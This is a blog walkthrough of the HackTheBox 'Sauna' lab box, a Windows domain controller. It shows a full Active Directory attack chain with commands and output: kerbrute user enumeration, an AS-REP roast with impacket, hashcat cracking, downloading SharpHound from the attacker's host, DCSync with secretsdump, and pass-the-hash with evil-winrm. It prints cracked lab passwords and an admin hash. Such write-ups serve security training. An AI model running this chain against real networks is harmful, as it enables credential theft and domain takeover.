---
title: "HTB - Sauna"
categories: [box]
date: 2022-12-06
comments: true
image: /images/walkthroughs/hackthebox/sauna/logo.png
favicon: /images/walkthroughs/hackthebox/sauna/logo.png
description: HTB - Sauna walkthrough
---

# Sauna 

<p align="center">
  <img src="/images/walkthroughs/hackthebox/sauna/banner.png" width="70%"/>
</p>


## Summary


Sauna is a easy box where we find an static website with the names of the team in the organization. using those names we can kerbrute to find two users _fsmith_ and _hsmith_. The first one is kerberoastable and we could crack it, revealing his password and giving us access to the machine.

Once inside we run bloodhound and find out the the _svc_loanmgr_ user has DCSync capabilities, so we set is as the target. With bloodhound I did not find a grat path for that lateral movement, so I used winpeas to reveal an autologon password for that user (actually its name was a little bit different). Using those credentials we can perform the DCSync attack and get the Administrator hash. With it, we can use a Pass-The-Hash attack to login as Administrator and solve this box.


## Enumeration


- nmap

```bash
Nmap scan report for 10.129.95.180
Host is up (0.040s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-12-08 15:28:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-12-08T15:28:56
|_  start_date: N/A
```


Adding EGOTISTICAL-BANK.LOCAL to /etc/hosts

We get into the website, seems to be static, no active forms, gobuster output is usual, no great stuff:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/sauna/1_0_web.png" width="90%"/>
</p>


- ldapsearch

```bash
ldapsearch -H ldap://10.129.95.180 -x -b "DC=EGOTISTICAL-BANK,DC=local" Users

# EGOTISTICAL-BANK.LOCAL
dn: DC=EGOTISTICAL-BANK,DC=LOCAL

# Users, EGOTISTICAL-BANK.LOCAL
dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL

# Computers, EGOTISTICAL-BANK.LOCAL
dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL

# Domain Controllers, EGOTISTICAL-BANK.LOCAL
dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL

# System, EGOTISTICAL-BANK.LOCAL
dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL

# LostAndFound, EGOTISTICAL-BANK.LOCAL
dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL

# Infrastructure, EGOTISTICAL-BANK.LOCAL
dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL

# ForeignSecurityPrincipals, EGOTISTICAL-BANK.LOCAL
dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL

# Program Data, EGOTISTICAL-BANK.LOCAL
dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL

# NTDS Quotas, EGOTISTICAL-BANK.LOCAL
dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL

# Managed Service Accounts, EGOTISTICAL-BANK.LOCAL
dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL

# Keys, EGOTISTICAL-BANK.LOCAL
dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL

# TPM Devices, EGOTISTICAL-BANK.LOCAL
dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL

# Builtin, EGOTISTICAL-BANK.LOCAL
dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL

# Hugo Smith, EGOTISTICAL-BANK.LOCAL
dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
```

I did not find to much info with ldapsearch, only the Hugo Smith name, let's use kerbrute to see if I can grab the username for Hugo Smith or its syntax.

- kerbrute

```bash
./kerbrute userenum --dc EGOTISTICAL-BANK.local -d EGOTISTICAL-BANK.local /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/08/22 - Ronnie Flathers @ropnop

2022/12/08 04:13:54 >  Using KDC(s):
2022/12/08 04:13:54 >   EGOTISTICAL-BANK.local:88

2022/12/08 04:14:02 >  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.local
2022/12/08 04:14:44 >  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.local
```

Once I found hsmith I stopped the kerbrute since the noise is considerable for a real world pentest. I might use a better fit userlist for the enumeration. I went to the _about_ page and grab the users (+ hugo smith shown by ldapsearch) and crafted this list following the syntax:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/sauna/1_1_team.png" width="90%"/>
</p>

```
fsmith
scoins
btaylor
sdriver
hbear
hsmith
skerb
```

Then kerbrute outputed this:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/sauna/2_0_kerbrute.png" width="80%"/>
</p>


```
hsmith@EGOTISTICAL-BANK.local
fsmith@EGOTISTICAL-BANK.local
```

Using GetNPUsers from impacket I tested if any of those are vulnerable to AS-REP attack. Eventually, fsmith was, so I get its hash:

```bash
python3 GetNPUsers.py EGOTISTICAL-BANK.local/ -usersfile /home/kali/Desktop/HackTheBox/Sauna/usernames.txt -dc-ip 10.129.95.180 -request

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:c3d39b10ac576bf88697be1fd65002d0$2d49ec8871ad5deb631f142cba585dcc21abb6e4c27a65ec2743e70c855c1573136f41e7d1f1f05b7e3762d76b5b7cbcef88f19e35290e1af5bd87074c526ab3557927b37df73ec001c048d7f69349c3044efa9a3a42ea6ef7c87153fb37b37f372b74525bc86ea64323c2b1ec6620e6b5a0876797b24ca5b630bfeffa24a4d4a55c5b9289c13b7b001737e9b343a9893741727174bce479224b80522cf781c2d364589097635fde12cf77a83e82af4326d7b4602a43a035cab0b57a11435c2c4a07ff6d8c9d5652ef7e0c8da7ab8a4eb1fed6bbcd50ce6d05ff894e680e42e905565196767754969c1aae941becde1a11de452ca0588a26936191b16ae82cec
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

Now we can use hashcat to crack the hash:


```bash
hashcat -m 18200 -a 0 fsmith_as.hash /usr/share/wordlists/rockyou.txt

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:c3d39b10ac576bf88697be1fd65002d0$2d49ec8871ad5deb631f142cba585dcc21abb6e4c27a65ec2743e70c855c1573136f41e7d1f1f05b7e3762d76b5b7cbcef88f19e35290e1af5bd87074c526ab3557927b37df73ec001c048d7f69349c3044efa9a3a42ea6ef7c87153fb37b37f372b74525bc86ea64323c2b1ec6620e6b5a0876797b24ca5b630bfeffa24a4d4a55c5b9289c13b7b001737e9b343a9893741727174bce479224b80522cf781c2d364589097635fde12cf77a83e82af4326d7b4602a43a035cab0b57a11435c2c4a07ff6d8c9d5652ef7e0c8da7ab8a4eb1fed6bbcd50ce6d05ff894e680e42e905565196767754969c1aae941becde1a11de452ca0588a26936191b16ae82cec:Thestrokes23
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:c3d39b1...e82cec
Time.Started.....: Thu Dec  8 04:33:55 2022 (9 secs)
Time.Estimated...: Thu Dec  8 04:34:04 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1156.2 kH/s (1.09ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10536960/14344385 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tiffany95 -> Thelittlemermaid
```

Success, the credentials are:

**fsmith:Thestrokes23**

With evil-winrm, log into the box and get the user flag:

```bash
evil-winrm -i 10.129.95.180 -u fsmith
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/sauna/3_0_user.png" width="90%"/>
</p>



## Privesc

We can see (what it can be) a service account in the home directory:

```bash
*Evil-WinRM* PS C:\Users> dir

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/25/2020   1:05 PM                Administrator
d-----        1/23/2020   9:52 AM                FSmith
d-r---        1/22/2020   9:32 PM                Public
d-----        1/24/2020   4:05 PM                svc_loanmgr
```

Enumerating the directories in the machine and the web files shown nothing relevant, so I'm going to load sharphound to get AD information.

```bash
Invoke-WebRequest -Uri "http://10.10.14.2:5454/PowerView.ps1" -outfile PowerView.ps1
Invoke-WebRequest -Uri "http://10.10.14.2:5454/SharpHound.ps1" -outfile SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain EGOTISTICAL-BANK.local -ZipFileName loot.zip
```

Checking bloodhound analysis, we see that _svc_loadnmgr_ can DCSync... Let's keep looking for any lateral movement to that user:

<p align="center">
  <img src="/images/walkthroughs/hackthebox/sauna/4_0_svc.png" width="90%"/>
</p>

Checking Winpeas' output, we can see the autologon password but the user is different from the _svc_loanmgr_ we have seen previously. With the user we saw in the box works, so we are in as _svc_loanmgr_

**svc_loanmgr:Moneymakestheworldgoround!**

Now we can perform the dcsync attack. I'm using impacket secretsdump.py:

```bash
python3 secretsdump.py svc_loanmgr:'Moneymakestheworldgoround!'@10.129.95.180
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/sauna/4_2_dcsync.png" width="90%"/>
</p>


And use the NTLM hash to do a Pass-The-Hash attack:

```bash
evil-winrm -i 10.129.95.180 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

<p align="center">
  <img src="/images/walkthroughs/hackthebox/sauna/5_0_root.png" width="80%"/>
</p>

Grab the root flag and enjoy!